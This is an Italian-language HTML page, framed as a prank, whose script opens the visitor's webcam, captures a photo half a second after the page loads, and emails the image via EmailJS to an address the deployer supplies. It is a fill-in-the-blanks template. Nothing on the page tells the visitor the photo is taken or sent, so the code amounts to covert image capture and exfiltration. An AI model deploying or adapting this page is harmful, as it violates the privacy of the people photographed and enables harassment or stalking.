<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scherzo - Foto Automatica</title>
</head>
<body>
    <h2>Inizia lo scherzo!</h2>
    <video id="video" width="640" height="480" autoplay></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script>
        let video = document.getElementById('video');
        let canvas = document.getElementById('canvas');
        let context = canvas.getContext('2d');

        // Richiedere il permesso per la fotocamera
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(stream) {
                video.srcObject = stream;
            })
            .catch(function(error) {
                console.log("Errore nell'accesso alla fotocamera: ", error);
            });

        // Funzione che scatta la foto dopo 0,5 secondi
        setTimeout(function() {
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            let photo = canvas.toDataURL('image/jpeg');

            // Invia la foto via EmailJS
            sendPhotoToEmail(photo);
        }, 500); // Dopo 0,5 secondi scatta la foto

        function sendPhotoToEmail(photo) {
            // Qui usiamo EmailJS per inviare la foto tramite email
            emailjs.send("service_mrkzn2a", "template_XXX", {
                photo: photo,
                to_email: "la_tua_email@gmail.com" // Sostituisci con la tua email
            })
            .then(function(response) {
                console.log("Email inviata con successo", response);
            }, function(error) {
                console.log("Errore nell'invio dell'email", error);
            });
        }
    </script>

    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        emailjs.init("YOUR_USER_ID"); // Sostituisci "YOUR_USER_ID" con il tuo ID utente di EmailJS
    </script>
</body>
</html>
